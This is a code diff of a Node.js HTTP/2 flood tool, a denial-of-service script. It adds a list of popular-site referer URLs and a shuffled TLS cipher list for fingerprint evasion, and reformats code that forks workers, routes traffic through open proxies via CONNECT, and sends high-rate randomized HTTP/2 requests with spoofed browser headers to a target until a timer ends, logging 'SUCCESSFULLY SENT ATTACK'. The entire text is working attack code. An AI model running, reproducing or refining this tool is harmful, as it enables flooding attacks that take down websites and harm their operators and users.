+    'https://www.mapbox.com',
+    'https://www.mapboxgl-js.com',
+    'https://www.openstreetmap.org',
+    'https://www.mapbox.com',
+    'https://www.mapboxgl-js.com',
+    'https://www.chartjs.org',
+    'https://www.highcharts.com',
+    'https://www.d3js.org',
+    'https://www.lesscss.org',
+    'https://www.sass-lang.com',
+    'https://www.materializecss.com',
+    'https://www.bootstrap.com',
+    'https://www.vuejs.org',
+    'https://www.angularjs.org',
+    'https://www.reactjs.org',
+    'https://www.jquery.com',
+    'https://www.ruby-lang.org',
+    'https://www.python.org',
+    'https://www.php.net',
+    'https://www.mysql.com',
+    'https://www.apache.org',
+    'https://www.mozilla.org',
+    'https://www.wikimedia.org',
+    'https://www.wikipedia.org',
+    'https://www.redcross.org',
+    'https://www.savethechildren.org',
+    'https://www.unicef.org',
+    'https://www.doctorswithoutborders.org',
+    'https://www.oxfam.org',
+    'https://www.greenpeace.org',
+    'https://www.hrw.org',
+    'https://www.amnesty.org',
+    'https://www.icrc.org',
+    'https://www.nato.int',
+    'https://www.europa.eu',
+    'https://www.oecd.org',
+    'https://www.wto.org',
+    'https://www.imf.org',
+    'https://www.worldbank.org',
+    'https://www.un.org',
+    'https://www.who.int',
+    'https://www.scientificamerican.com',
+    'https://www.sciencemag.org',
+    'https://www.nature.com',
+    'https://www.fda.gov',
+    'https://www.cancer.gov',
+    'https://www.medlineplus.gov',
+    'https://www.nih.gov',
+    'https://www.cdc.gov',
+    'https://www.mayoclinic.org',
+    'https://www.webmd.com',
+    'https://www.healthline.com',
+    'https://www.britannica.com',
+    'https://www.nypl.org',
+    'https://www.nasa.gov',
+    'https://www.nationalgeographic.com',
+    'https://www.colbertnation.com',
+    'https://www.thedailyshow.com',
+    'https://www.thedailybeast.com',
+    'https://www.dictionary.com',
+    'https://www.merriam-webster.com',
+    'https://www.cnbc.com',
+    'https://www.bloomberg.com',
+    'https://www.wsj.com',
+    'https://www.washingtonpost.com',
+    'https://www.huffingtonpost.com',
+    'https://www.theguardian.com',
+    'https://www.bbc.com',
+    'https://www.npr.org',
+    'https://www.quora.com',
+    'https://www.reddit.com',
+    'https://www.msn.com',
+    'https://www.nytimes.com',
+    'https://www.wikipedia.org',
+    'https://www.microsoft.com',
+    'https://www.apple.com',
+    'https://www.cnn.com',
+    'https://www.linkedin.com',
+    'https://www.github.com',
+    'https://www.stackoverflow.com',
+    'https://www.yahoo.com',
+    'https://www.instagram.com',
+    'https://www.netflix.com',
+    'https://www.amazon.com',
+    'https://www.youtube.com',
+    'https://www.twitter.com',
+    'https://www.facebook.com',
+    'https://www.google.com'
+];
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers1 = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
+].join(":");
+
+const uap = [
     "facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
     "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba",
     "Opera/9.25 (Windows NT 6.0; U; en)",
@@ -1001,119 +1426,119 @@ const net = require("net");
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
- ];
+];
 
- var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
- var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
- var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
- var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
- var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
- var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
- var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
- var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
- var proxies = readLines(args.proxyFile);
- const parsedTarget = url.parse(args.target);
- 
-      if (cluster.isMaster) {
-        for (let counter = 1; counter <= args.threads; counter++) {
-          cluster.fork();
-        }
-      } else {
-        setInterval(runFlooder);
-      };
- 
- class NetSocket {
-     constructor(){}
- 
-  HTTP(options, callback) {
-     const parsedAddr = options.address.split(":");
-     const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
-     const buffer = new Buffer.from(payload);
- 
-     const connection = net.connect({
-         host: options.host,
-         port: options.port
-     });
- 
-     //connection.setTimeout(options.timeout * 600000);
-     connection.setTimeout(options.timeout * 100000);
-     connection.setKeepAlive(true, 100000);
- 
-     connection.on("connect", () => {
-         connection.write(buffer);
-     });
- 
-     connection.on("data", chunk => {
-         const response = chunk.toString("utf-8");
-         const isAlive = response.includes("HTTP/1.1 200");
-         if (isAlive === false) {
-             connection.destroy();
-             return callback(undefined, "error: invalid response from proxy server");
-         }
-         return callback(connection, undefined);
-     });
- 
-     connection.on("timeout", () => {
-         connection.destroy();
-         return callback(undefined, "error: timeout exceeded");
-     });
- 
-     connection.on("error", error => {
-         connection.destroy();
-         return callback(undefined, "error: " + error);
-     });
- }
- }
+var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
+var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
+var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
+var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
+var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
+var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
+var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
+var proxies = readLines(args.proxyFile);
+const parsedTarget = url.parse(args.target);
 
- const Socker = new NetSocket();
- headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- //headers["X-Forwarded-For"] = spoofed;
- //headers["X-Forwarded-Host"] = spoofed;
- //headers["Real-IP"] = spoofed;
- headers["cache-control"] = control;
- headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
- //headers["origin"] = "https://" + parsedTarget.host;
- //headers["referer"] = "https://" + parsedTarget.host;
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = randstr(15);
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "none";
- headers["TE"] = "trailers";
- //headers["Trailer"] = "Max-Forwards";
- headers["sec-fetch-user"] = "?1";
- headers["x-requested-with"] = "XMLHttpRequest";
- 
- function runFlooder() {
-     const proxyAddr = randomElement(proxies);
-     const parsedProxy = proxyAddr.split(":"); 
-	 //headers[":authority"] = parsedTarget.host;
-         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
-         headers["origin"] = "https://" + parsedTarget.host;
+if (cluster.isMaster) {
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
+} else {
+    setInterval(runFlooder);
+};
 
-     const proxyOptions = {
-         host: parsedProxy[0],
-         port: ~~parsedProxy[1],
-         address: parsedTarget.host + ":443",
-         timeout: 100,
-     };
+class NetSocket {
+    constructor() { }
 
-     Socker.HTTP(proxyOptions, (connection, error) => {
-         if (error) return
- 
-         connection.setKeepAlive(true, 600000);
+    HTTP(options, callback) {
+        const parsedAddr = options.address.split(":");
+        const addrHost = parsedAddr[0];
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+        const buffer = new Buffer.from(payload);
 
-         const tlsOptions = {
+        const connection = net.connect({
+            host: options.host,
+            port: options.port
+        });
+
+        //connection.setTimeout(options.timeout * 600000);
+        connection.setTimeout(options.timeout * 100000);
+        connection.setKeepAlive(true, 100000);
+
+        connection.on("connect", () => {
+            connection.write(buffer);
+        });
+
+        connection.on("data", chunk => {
+            const response = chunk.toString("utf-8");
+            const isAlive = response.includes("HTTP/1.1 200");
+            if (isAlive === false) {
+                connection.destroy();
+                return callback(undefined, "error: invalid response from proxy server");
+            }
+            return callback(connection, undefined);
+        });
+
+        connection.on("timeout", () => {
+            connection.destroy();
+            return callback(undefined, "error: timeout exceeded");
+        });
+
+        connection.on("error", error => {
+            connection.destroy();
+            return callback(undefined, "error: " + error);
+        });
+    }
+}
+
+const Socker = new NetSocket();
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+//headers["X-Forwarded-For"] = spoofed;
+//headers["X-Forwarded-Host"] = spoofed;
+//headers["Real-IP"] = spoofed;
+headers["cache-control"] = control;
+headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+//headers["origin"] = "https://" + parsedTarget.host;
+//headers["referer"] = "https://" + parsedTarget.host;
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["user-agent"] = randstr(15);
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "none";
+headers["TE"] = "trailers";
+//headers["Trailer"] = "Max-Forwards";
+headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
+
+function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+    //headers[":authority"] = parsedTarget.host;
+    headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
+    headers["origin"] = "https://" + parsedTarget.host;
+
+    const proxyOptions = {
+        host: parsedProxy[0],
+        port: ~~parsedProxy[1],
+        address: parsedTarget.host + ":443",
+        timeout: 100,
+    };
+
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) return
+
+        connection.setKeepAlive(true, 600000);
+
+        const tlsOptions = {
             host: parsedTarget.host,
             port: 443,
             secure: true,
@@ -1128,58 +1553,58 @@ const net = require("net");
             secureProtocol: "TLS_method",
         };
 
-         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
 
-         tlsConn.setKeepAlive(true, 60000);
+        tlsConn.setKeepAlive(true, 60000);
 
-         const client = http2.connect(parsedTarget.href, {
-             protocol: "https:",
-             settings: {
-            headerTableSize: 65536,
-            maxConcurrentStreams: 2000,
-            initialWindowSize: 65535,
-            maxHeaderListSize: 65536,
-            enablePush: false
-          },
-             maxSessionMemory: 64000,
-             maxDeflateDynamicTableSize: 4294967295,
-             createConnection: () => tlsConn,
-             socket: connection,
-         });
- 
-         client.settings({
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                headerTableSize: 65536,
+                maxConcurrentStreams: 2000,
+                initialWindowSize: 65535,
+                maxHeaderListSize: 65536,
+                enablePush: false
+            },
+            maxSessionMemory: 64000,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        });
+
+        client.settings({
             headerTableSize: 65536,
             maxConcurrentStreams: 2000,
             initialWindowSize: 6291456,
             maxHeaderListSize: 65536,
             enablePush: false
-          });
- 
-         client.on("connect", () => {
+        });
+
+        client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
                     //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                     const request = client.request(headers)
-                    
-                    .on("response", response => {
-                        request.close();
-                        request.destroy();
-                        return
-                    });
-    
+
+                        .on("response", response => {
+                            request.close();
+                            request.destroy();
+                            return
+                        });
+
                     request.end();
                 }
-            }, 1000); 
-         });
- 
-         client.on("close", () => {
-             client.destroy();
-             connection.destroy();
-             return
-         });
-     }),function (error, response, body) {
-		};
- }
- console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
- const KillScript = () => process.exit(1);
- setTimeout(KillScript, args.time * 1000);
+            }, 1000);
+        });
+
+        client.on("close", () => {
+            client.destroy();
+            connection.destroy();
+            return
+        });
+    }), function (error, response, body) {
+    };
+}
+console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
+const KillScript = () => process.exit(1);
+setTimeout(KillScript, args.time * 1000);
